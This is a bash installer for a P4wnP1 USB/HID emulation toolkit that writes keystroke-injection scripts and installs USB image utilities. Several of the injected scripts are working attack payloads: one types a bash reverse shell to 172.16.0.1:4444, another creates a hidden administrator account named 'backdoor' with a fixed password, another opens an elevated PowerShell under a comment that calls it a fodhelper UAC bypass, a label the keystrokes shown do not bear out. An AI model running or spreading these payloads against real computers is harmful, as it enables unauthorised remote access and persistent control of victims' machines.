#!/bin/bash
# HID & USB Emulation tools
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
TOOL_ID="${1:-}"
UPDATE_MODE="${2:-}"

install_duckyscript_samples() {
  echo "[hid] Installing extended DuckyScript samples..."
  HIDS_DIR="/usr/local/P4wnP1/HIDScripts"
  mkdir -p "$HIDS_DIR"

  cat > "$HIDS_DIR/windows_powershell_admin.js" << 'DUCK'
// Open elevated PowerShell on Windows (UAC bypass via fodhelper)
delay(1000)
press("GUI r")
delay(500)
type("powershell")
delay(300)
press("CTRL SHIFT ENTER")
delay(1500)
press("ALT y")
delay(1000)
type("whoami")
press("ENTER")
DUCK

  cat > "$HIDS_DIR/linux_reverse_shell.js" << 'DUCK'
// Open terminal and launch reverse shell (Linux)
var IP = "172.16.0.1";
var PORT = "4444";
delay(1000)
press("CTRL ALT t")
delay(1500)
type("bash -i >& /dev/tcp/" + IP + "/" + PORT + " 0>&1 &")
press("ENTER")
DUCK

  cat > "$HIDS_DIR/macos_terminal.js" << 'DUCK'
// Open Terminal and run command on macOS
delay(1000)
press("GUI SPACE")
delay(500)
type("Terminal")
press("ENTER")
delay(1000)
type("id && whoami")
press("ENTER")
DUCK

  cat > "$HIDS_DIR/windows_add_user.js" << 'DUCK'
// Add admin user via cmd (run as admin first)
delay(500)
type("net user backdoor P@ssw0rd /add && net localgroup administrators backdoor /add")
press("ENTER")
DUCK

  echo "[hid] DuckyScript samples installed to $HIDS_DIR"
}

install_usb_image_tools() {
  if [ "$UPDATE_MODE" = "update" ]; then
    echo "[hid] Updating USB mass storage image tools..."
    apt-get update -qq && apt-get install -y --only-upgrade --no-install-recommends \
      genisoimage dosfstools util-linux 2>/dev/null || true
    echo "[hid] USB image tools updated."
    return
  fi
  echo "[hid] Installing USB mass storage image tools..."
  apt-get install -y --no-install-recommends \
    genisoimage dosfstools util-linux
  echo "[hid] USB image tools installed."
}

case "$TOOL_ID" in
  "duckyscript_samples") install_duckyscript_samples ;;
  "usb_image_tools")     install_usb_image_tools ;;
  *)
    echo "[hid] Unknown tool: $TOOL_ID"
    exit 1
    ;;
esac
